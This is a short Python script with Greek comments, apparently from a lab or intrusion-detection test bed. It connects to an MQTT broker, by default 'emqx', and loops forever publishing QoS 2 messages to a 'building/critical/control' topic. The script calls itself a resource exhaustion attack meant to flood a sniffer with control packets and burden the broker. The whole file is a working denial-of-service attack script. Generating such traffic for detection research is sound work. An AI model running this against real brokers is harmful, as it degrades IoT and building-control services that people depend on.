import json
import paho.mqtt.client as mqtt
import time
import random
import socket
import os


# Παίρνουμε το όνομα του Pod
pod_id = socket.gethostname()
BROKER = os.getenv("BROKER_HOST", "emqx")
CLIENT_ID = f"Attack_{os.path.basename(__file__)}_{pod_id}"
# Προαιρετικό delay για να μην ξεκινήσουν όλα μαζί
delay = int(os.getenv("INITIAL_DELAY", "0"))
time.sleep(delay)
client = mqtt.Client(client_id=CLIENT_ID)
client.connect(BROKER, 1883)
client.loop_start()

print("[!] Starting QoS 2 Resource Exhaustion Attack...")
try:
    while True:
        payload = {"device_id": CLIENT_ID, "CRITICAL_DATA": random.randint(1000, 9999)}
        # Το QoS 2 θα αναγκάσει τον Sniffer να δει πολλά Control Packets
        # και τον Broker να κάνει βαριά διαχείριση.
        client.publish("building/critical/control", json.dumps(payload), qos=2)

        # Μικρό delay για να προλαβαίνει να γεμίζει το TCP buffer
        time.sleep(1)
except KeyboardInterrupt:
    client.disconnect()
